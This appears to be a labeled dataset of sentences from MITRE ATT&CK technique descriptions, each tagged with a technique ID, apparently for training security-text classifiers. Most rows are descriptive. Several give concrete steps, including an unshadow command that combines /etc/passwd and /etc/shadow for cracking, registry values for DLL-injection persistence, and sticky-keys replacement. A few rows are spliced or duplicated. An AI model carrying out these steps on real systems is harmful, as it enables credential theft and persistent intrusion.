T1003,Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking.
T1003,Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow.
T1003,"By default, /etc/shadow is only readable by the root user."
T1003,"The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: # /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db"
T1557,Adversaries may poison Address Resolution Protocol  caches to position themselves between the communication of two or more networked devices.
T1557,This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.
T1557,"The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control  address."
T1557,Devices in a local network segment communicate with each other by using link layer addresses.
T1557,"If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address."
T1557,The device with the associated IP address directly replies with its MAC address.
T1557,The networked device that made the ARP request will then use as well as store that information in its ARP cache.
T1557,An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device.
T1557,"The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device."
T1557,"For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner."
T1557,Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.
T1557,The ARP protocol is stateless and does not require authentication.
T1557,"Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache."
T1557,Adversaries may use ARP cache poisoning as a means to intercept network traffic.
T1557,"This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol."
T1557,Cleaver has used custom tools to facilitate ARP cache poisoning.
T1558,Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages.
T1558,Preauthentication offers protection against offline Password Cracking.
T1558,"When enabled, a user requesting access to a resource initiates communication with the Domain Controller  by sending an Authentication Server Request  message with a timestamp that is encrypted with the hash of their password."
T1558,"If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response  message that contains the Ticket Granting Ticket  to the user."
T1558,Part of the AS-REP message is signed with the user’s password.
T1558,"For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4."
T1558,The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.
T1558,"An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter."
T1558,"Alternatively, the adversary may send an AS-REQ message for each user."
T1558,"If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data."
T1558,"Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts."
T1548,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions.
T1548,Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine.
T1548,Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.
T1548,An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.
T1134,Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls.
T1134,Windows uses access tokens to determine the ownership of a running process.
T1134,A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process.
T1134,"When this occurs, the process also takes on the security context associated with the new token."
T1134,An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.
T1134,These token can then be applied to an existing process  Token Impersonation/Theft or used to spawn a new process  Create Process with Token.
T1134,An adversary must already be in a privileged user context  administrator to steal a token.
T1134,"However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level."
T1134,An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.
T1134,"Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account."
T1134,"There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens."
T1134,Duqu examines running system processes for tokens that have specific system privileges.
T1134,"If it finds one, it will copy the token and store it for later use."
T1134,Eventually it will start new processes with the stored token attached.
T1134,It can also steal tokens to acquire administrative privileges.
T1134,Hydraq creates a backdoor through which remote attackers can adjust token privileges.
T1134,SslMM contains a feature to manipulate process privileges and tokens.
T1134,Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege.
T1134,SUNSPOT modified its security token to grants itself debugging privileges by adding SeDebugPrivilege.
T1134,MegaCortex can enable SeDebugPrivilege and adjust token privileges.
T1134,AppleSeed can gain system level privilege by passing SeDebugPrivilege to the AdjustTokenPrivilege API.
T1134,Cuba has used SeDebugPrivilege and AdjustTokenPrivileges to elevate privileges.
T1134,KillDisk has attempted to get the access token of a process by calling OpenProcessToken.
T1134,"If KillDisk gets the access token, then it attempt to modify the token privileges with AdjustTokenPrivileges."
T1134,Blue Mockingbird has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\SYSTEM.
T1134,FIN6 has used has used Metasploit’s named-pipe impersonation technique to escalate privileges.
T1546,Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features.
T1546,Windows contains accessibility features that may be launched with a key combination before a user has logged in .
T1546,An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.
T1546,"Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed."
T1546,"The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen."
T1546,"Depending on the version of Windows, an adversary may take advantage of these features in different ways."
T1546,Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry.
T1546,"In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection ."
T1546,The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.
T1546,"For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program  may be replaced with ""cmd.exe"" ."
T1546,"Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges."
T1546,"Other accessibility features exist that may also be leveraged in a similar fashion: 
* On-Screen Keyboard: C:\Windows\System32\osk.exe
* Magnifier: C:\Windows\System32\Magnify.exe
* Narrator: C:\Windows\System32\Narrator.exe
* Display Switcher: C:\Windows\System32\DisplaySwitch.exe
* App Switcher: C:\Windows\System32\AtBroker.exe Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features."
T1546,"Other accessibility features exist that may also be leveraged in a similar fashion: 
* On-Screen Keyboard: C:\Windows\System32\osk.exe
* Magnifier: C:\Windows\System32\Magnify.exe
* Narrator: C:\Windows\System32\Narrator.exe
* Display Switcher: C:\Windows\System32\DisplaySwitch.exe
* App Switcher: C:\Windows\System32\AtBroker.exe APT3 replaces the Sticky Keys binary C:\Windows\System32\sethc.exe for persistence."
T1546,"APT29 used sticky-keys to obtain unauthenticated, privileged console access."
T1546,Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.
T1546,Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.
T1546,APT41 leveraged sticky keys to establish persistence.
T1546,Fox Kitten has used sticky keys to launch a command prompt.
T1531,Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users.
T1531,"Accounts may be deleted, locked, or manipulated  to remove access to accounts."
T1531,Adversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.
T1531,LockerGoga has been observed changing account passwords and logging off current users.
T1531,MegaCortex has changed user account passwords and logged users off the system.
T1087,Adversaries may attempt to get a listing of accounts on a system or within an environment.
T1087,This information can help adversaries determine which accounts exist to aid in follow-on behavior.
T1087,"XCSSET attempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data."
T1087,UNC2452 obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.
T1087,APT29 obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.
T1087,"APT32 enumerated administrative users and DC servers using the commands net localgroup administrators and net group ""Domain Controllers"" /domain."
T1098,Adversaries may manipulate accounts to maintain access to victim systems.
T1098,"Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups."
T1098,"These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials."
T1098,"In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain."
T1098,Calisto adds permissions and remote logins to all users.
T1098,SMOKEDHAM has added created user accounts to local Admin groups.
T1098,Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.
T1098,APT3 has been known to add created accounts to local admin groups to maintain elevated access.
T1098,Dragonfly 2.0 added newly created accounts to the administrators group to maintain elevated access.
T1098,Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network.
T1098,Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts.
T1098,The group then was able to authenticate to the intended victim's OWA  portal and read hundreds of email communications for information on Middle East organizations.
T1583,"Adversaries may buy, lease, or rent infrastructure that can be used during targeting."
T1583,A wide variety of infrastructure exists for hosting and orchestrating adversary operations.
T1583,"Infrastructure solutions include physical or cloud servers, domains, and third-party web services."
T1583,"Additionally, botnets are available for rent or purchase."
T1583,"Use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation."
T1583,"Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services."
T1583,"Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down."
T1595,Adversaries may execute active reconnaissance scans to gather information that can be used during targeting.
T1595,"Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction."
T1595,Adversaries may perform different forms of active scanning depending on what information they seek to gather.
T1595,"These scans can also be performed in various ways, including using native features of network protocols such as ICMP."
T1595,"Information from these scans may reveal opportunities for other forms of reconnaissance  or Search Open Technical Databases, establishing operational resources  or Obtain Capabilities, and/or initial access  or Exploit Public-Facing Application."
T1547,Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine.
T1547,Active Setup is a Windows mechanism that is used to execute programs when a user logs in.
T1547,The value stored in the Registry key will be executed after a user logs into the computer.
T1547,These programs will be executed under the context of the user and will have the account's associated permissions level.
T1547,Adversaries may abuse Active Setup by creating a key under  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\ and setting a malicious value for StubPath.
T1547,This value will serve as the program that will be executed when a user logs into the computer.
T1547,"Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots."
T1547,Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.
T1547,PoisonIvy creates a Registry key in the Active Setup pointing to a malicious executable.
T1098,An adversary may add the Global Administrator role to an adversary-controlled account to maintain persistent access to an Office 365 tenant.
T1098,"With sufficient permissions, a compromised account can gain almost unlimited access to data and settings  via the global admin role."
T1098,This account modification may immediately follow Create Account or other malicious account activity.
T1137,Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system.
T1137,Office add-ins can be used to add functionality to Office programs.
T1137,"There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries , VBA add-ins, Office Component Object Model  add-ins, automation add-ins, VBA Editor , Visual Studio Tools for Office  add-ins, and Outlook add-ins."
T1137,Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.
T1137,"Naikon has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host."
T1098,Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.
T1098,Adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.
T1098,These credentials include both x509 keys and passwords.
T1098,"With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules."
T1098,"In infrastructure-as-a-service  environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP."
T1098,This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.
T1098,UNC2452 added credentials to OAuth Applications and Service Principals.
T1098,APT29 has added credentials to OAuth Applications and Service Principals.
T1557,Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle  technique to support follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.
T1557,"By abusing features of common networking protocols that can determine the flow of network traffic , adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions."
T1557,"Adversaries may leverage the AiTM position to attempt to modify traffic, such as in Transmitted Data Manipulation."
T1557,"Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service."
T1557,Dok proxies web traffic to potentially monitor and alter victim HTTP traffic.
T1557,Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.
T1546,Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes.
T1546,"Dynamic-link libraries  that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded into every process that calls the ubiquitously used application programming interface  functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec."
T1546,"Similar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer."
T1546,Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.
T1546,PUNCHBUGGY can establish using a AppCertDLLs Registry key.
T1546,Honeybee's service-based DLL implant can execute a downloaded file with parameters specified using CreateProcessAsUser.
T1546,Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes.
T1546,Dynamic-link libraries  that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll.
T1546,"In practice this is nearly every program, since user32.dll is a very common library."
T1546,"Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer."
T1546,Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.
T1546,The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.
T1546,"If a victim meets certain criteria, T9000 uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll."
T1546,It does this by creating the following Registry keys: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1.
T1546,"Some variants of Cherry Picker use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows ""AppInit_DLLs""=""pserver32.dll"" Ramsay can insert itself into the address space of other applications using the AppInit DLL Registry key."
T1546,APT39 has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows in order to establish persistence.
T1059,Adversaries may abuse AppleScript for execution.
T1059,AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.
T1059,These AppleEvent messages can be sent independently or easily scripted with AppleScript.
T1059,"These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely."
T1059,"Scripts can be run from the command-line via osascript /path/to/script or osascript -e ""script here""."
T1059,"Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows."
T1059,AppleScripts can also be executed as plain text shell scripts by adding #!/usr/bin/osascript to the start of the script file.
T1059,"AppleScripts do not need to call osascript to execute, however."
T1059,"They may be executed from within mach-O binaries by using the macOS Native APIs NSAppleScript or OSAScript, both of which execute code independent of the /usr/bin/osascript command line utility."
T1059,"Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes."
T1059,"These events cannot start applications remotely , but they can interact with applications if they're already running remotely."
T1059,"On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format.."
T1059,"Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python."
T1059,Dok uses AppleScript to create a login item for persistence.
T1059,Bundlore can use AppleScript to inject malicious JavaScript into a browser.
T1059,ThiefQuest uses AppleScript's osascript -e command to launch ThiefQuest's persistence via Launch Agent and Launch Daemon.
T1550,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems."
T1550,These tokens are typically stolen from users and used in lieu of login credentials.
T1550,Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service .
T1550,OAuth is one commonly implemented framework that issues tokens to users for access to systems.
T1550,These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform.
T1550,"Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user."
T1550,"Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application."
T1550,"For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded."
T1550,With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.
T1550,Compromised access tokens may be used as an initial step in compromising other services.
T1550,"For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines."
T1550,Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.
T1550,"Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow."
T1550,"APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail."
T1499,Adversaries may target resource intensive features of web applications to cause a denial of service .
T1499,Specific features in web applications may be highly resource intensive.
T1499,Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.
T1071,Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic.
T1071,"Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server."
T1071,"Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS."
T1071,"For connections that occur internally within an enclave , commonly used protocols are SMB, SSH, or RDP."
T1071,"Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols."
T1071,Adversaries can also use NETEAGLE to establish an RDP connection with a controller over TCP/7519.
T1071,"The Regin malware platform supports many standard protocols, including SMB."
T1071,Cobalt Strike can conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol.
T1071,All protocols use their standard assigned ports.
T1071,Lucifer can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.
T1071,Hildegard has used an IRC channel for C2 communications.
T1071,Siloscape connects to an IRC server for C2.

T1071,Rocke issued wget requests from infected systems to the C2.
T1071,TeamTNT has used an IRC bot for C2 communications.
T1071,APT34 malware often uses HTTP and DNS for C2.
T1071,The group has also used the Plink utility and other tools to create tunnels to C2 servers.
T1546,Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.
T1546,The Microsoft Windows Application Compatibility Infrastructure/Framework  was created to allow for backward compatibility of software as the operating system codebase changes over time.
T1546,"For example, the application shimming feature allows developers to apply fixes to applications  that were created for Windows XP so that it will work with Windows 10."
T1546,"Within the framework, shims are created to act as a buffer between the program  and the Windows OS."
T1546,"When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database ."
T1546,"If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS."
T1546,"A list of all shims currently installed by the default Windows installer  is kept in:
* %WINDIR%\AppPatch\sysmain.sdb and
* hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb
Custom databases are stored in:
* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and
* hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom
To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim."
T1546,"However, certain shims can be used to Bypass User Account Control , inject DLLs into processes , disable Data Execution Prevention  and Structure Exception Handling , and intercept memory addresses ."
T1546,"Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc."
T1546,Shims can also be abused to establish persistence by continuously being invoked by affected programs.
T1546,ShimRat has installed shim databases in the AppPatch folder.
T1546,"SDBbot has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe."
T1546,Pillowmint has used a malicious shim database to maintain persistence.
T1546,FIN7 has used application shim databases for persistence.

T1027,Adversaries may use binary padding to add junk data and change the on-disk representation of malware.
T1027,"This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations."
T1027,Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.
T1027,The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.
T1027,Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files.
T1027,This may also reduce the likelihood of being collected for analysis.
T1027,"Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed."
T1027,"yty contains junk code in its binary, likely to confuse malware analysts."

T1547,LoudMiner can automatically launch at startup if the AutoStart option is enabled in the VBoxVmService configuration file.
T1037,Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.
T1037,"Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server."
T1037,These scripts can vary based on operating system and whether applied locally or remotely.
T1037,Adversaries may use these scripts to maintain persistence on a single system.
T1037,"Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary."
T1037,An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.
T1037,"Rocke has installed an ""init.d"" startup script to maintain persistence."
T1542,Adversaries may use bootkits to persist on systems.
T1542,Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.
T1542,"A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record  and Volume Boot Record ."
T1542,The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS.
T1542,It is the location of the boot loader.
T1542,"An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code."
T1542,The MBR passes control of the boot process to the VBR.
T1542,"Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code."
T1542,BOOTRASH is a Volume Boot Record  bootkit that uses the VBR to maintain persistence.
T1542,ROCKBOOT is a Master Boot Record  bootkit that uses the MBR to establish persistence.

T1583,"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting."
T1583,A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.
T1583,Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service.
T1583,"With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service ."
T1584,Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting.
T1584,"Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems."
T1584,"Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers."
T1217,Adversaries may enumerate browser bookmarks to learn more about compromised hosts.
T1217,"Browser bookmarks may reveal personal information about users  as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure."
T1217,"Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser."
T1217,"Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases."

T1217,"APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources."
T1176,Adversaries may abuse Internet browser extensions to establish persistent access to victim systems.
T1176,Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers.
T1176,They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.
T1176,"Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system."
T1176,Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.
T1176,"Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions."
T1176,"Previous to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files."
T1176,"In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction."
T1176,"Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser  and be used as an installer for a RAT for persistence."
T1176,There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.
T1176,There have also been similar examples of extensions being used for command & control.
T1176,OSX/Shlayer can install malicious Safari browser extensions to serve ads.
T1176,Bundlore can install malicious browser extensions that are used to hijack user searches.
T1176,Grandoreiro can use malicious browser extensions to steal cookies and other user information.
T1176,Stolen Pencil victims are prompted to install malicious Google Chrome extensions which gave the threat actor the ability to read data from any website accessed.
T1176,Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.
T1185,"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques."
T1185,"A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet."
T1185,"Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights."
T1185,Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic.
T1185,"This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed."
T1185,The adversary assumes the security context of whichever browser process the proxy is injected into.
T1185,Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly.
T1185,"With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions."
T1185,Browser pivoting may also bypass security provided by 2-factor authentication.
T1185,TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.

T1185,QakBot can use advanced web injects to steal web banking credentials.
T1185,Chaes has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.
T1110,Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.
T1110,"Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism."
T1110,"Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes."
T1110,Brute forcing credentials may take place at various points during a breach.
T1110,"For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery."
T1110,Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access.

T1110,"Dragonfly dropped and executed Hydra, a password cracker."
T1612,Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry.
T1612,"A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it."
T1612,"An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image."
T1612,"If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image."
T1612,"If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment."
T1591,Adversaries may gather information about the victim's business relationships that can be used during targeting.
T1591,"Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains  that have connected  network access."
T1591,This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.
T1591,"Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information."
T1591,Information about business relationships may also be exposed to adversaries via online or other accessible data sets  or Search Victim-Owned Websites.
T1591,"Gathering this information may reveal opportunities for other forms of reconnaissance  or Search Open Websites/Domains, establishing operational resources  or Compromise Accounts, and/or initial access , Drive-by Compromise, or Trusted Relationship."
T1591,"In preparation for its attack against the 2018 Winter Olympics, Sandworm Team conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site."
T1548,Adversaries may bypass UAC mechanisms to elevate process privileges on system.
T1548,"Windows User Account Control  allows a program to elevate its privileges  to perform a task under administrator-level permissions, possibly by prompting the user for confirmation."
T1548,The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.
T1548,"If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box."
T1548,An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access.
T1548,Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.
T1548,Many methods have been discovered to bypass UAC.
T1548,"The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses."
T1548,"Additional bypass methods are regularly discovered and some used in the wild, such as:
* eventvwr.exe can auto-elevate and execute a specified binary or script."
T1548,"Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity."

